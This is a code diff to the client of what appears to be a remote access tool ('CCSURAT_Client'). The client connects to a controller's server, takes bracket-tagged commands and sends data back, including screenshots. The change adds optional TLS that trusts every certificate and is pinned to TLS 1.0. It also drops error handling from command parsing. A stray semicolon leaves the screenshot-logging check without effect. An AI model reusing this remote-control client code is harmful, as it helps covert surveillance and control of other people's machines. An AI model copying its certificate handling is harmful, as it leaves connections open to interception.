@@ -30,6 +30,7 @@ namespace CCSURAT_Client
         private Queue<string> commandQueue;
 
         // Security
+        private bool sslSecured = false;
         private SslStream sslStream;
         private StreamWriter sw;
         private StreamReader sr;
@@ -88,12 +89,15 @@ namespace CCSURAT_Client
                         client = new TcpClient();
                         client.Connect(serverIP, serverPort);
                         netStream = client.GetStream();
+                        if (sslSecured)
+                        {
+                            // Create an SSL stream that wraps netstream
+                            sslStream = new SslStream(netStream, false, new RemoteCertificateValidationCallback(TrustAllCertificatesCallback));
+                            X509Certificate2Collection xc = new X509Certificate2Collection();
 
-                        sslStream = new SslStream(netStream, false, new RemoteCertificateValidationCallback(TrustAllCertificatesCallback));
-
-
-                        X509Certificate2Collection xc = new X509Certificate2Collection();
-                        sslStream.AuthenticateAsClient(serverIP, xc, SslProtocols.Tls, false);
+                            // Authenticate with server using TLS without a certificate
+                            sslStream.AuthenticateAsClient(serverIP, xc, SslProtocols.Tls, false);
+                        }
 
                         isConnected = true;
                         status = "Connected.";
@@ -126,12 +130,13 @@ namespace CCSURAT_Client
             //netStream = client.GetStream();
             try
             {
-                while (netStream.CanRead && IsAlive() && IsSocketConnected(client.Client))
+                while ((sslSecured ? sslStream.CanRead : netStream.CanRead) && IsAlive() && IsSocketConnected(client.Client))
                 {
                     byte[] bytes = new byte[1024];
                     string data = null;
                     int i;
-                    if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
+                    if ((i = sslSecured ? sslStream.Read(bytes, 0, bytes.Length) :
+                                          netStream.Read(bytes, 0, bytes.Length)) != 0)
                     {
                         // convert data bytes to string
                         data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
@@ -194,8 +199,10 @@ namespace CCSURAT_Client
             {
                 // write empty buffer to server to check if connection is alive
                 byte[] empty = new byte[1];
-                //netStream.Write(empty, 0, 0);
-                netStream.Write(empty, 0, 0);
+                if (sslSecured)
+                    sslStream.Write(empty, 0, 0);
+                else
+                    netStream.Write(empty, 0, 0);
                 return true;
             }
             catch (SocketException ex)
@@ -326,15 +333,10 @@ namespace CCSURAT_Client
         // Checks if first command in data is closed.
         private bool FirstCommandIsClosed(string data)
         {
-            try {
-                string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
-                openCommandTag = data.Substring(2, openCommandTag.Length - 4);
-                string closeCommandTag = "[[/" + openCommandTag + "]]";
-                return data.Contains(closeCommandTag);
-            } catch(Exception ex)
-            {
-                return false;
-            }
+            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
+            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
+            string closeCommandTag = "[[/" + openCommandTag + "]]";
+            return data.Contains(closeCommandTag);
         }
 
         // Gets the first command in data.
@@ -356,8 +358,10 @@ namespace CCSURAT_Client
                 try
                 {
                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
-                    //netStream.Write(msg, 0, msg.Length);
-                    netStream.Write(msg, 0, msg.Length);
+                    if (sslSecured)
+                        sslStream.Write(msg, 0, msg.Length);
+                    else
+                        netStream.Write(msg, 0, msg.Length);
                     Thread.Sleep(20);
                     if (!data.Contains("[[SCREENSHOT]]"));
                         Log("Data sent: " + data);
@@ -377,7 +381,10 @@ namespace CCSURAT_Client
                 try
                 {
                     //netStream.Write(data, 0, data.Length);
-                    netStream.Write(data, 0, data.Length);
+                    if(sslSecured)
+                        sslStream.Write(data, 0, data.Length);
+                    else
+                        netStream.Write(data, 0, data.Length);
                 }
                 catch (Exception ex)
                 {
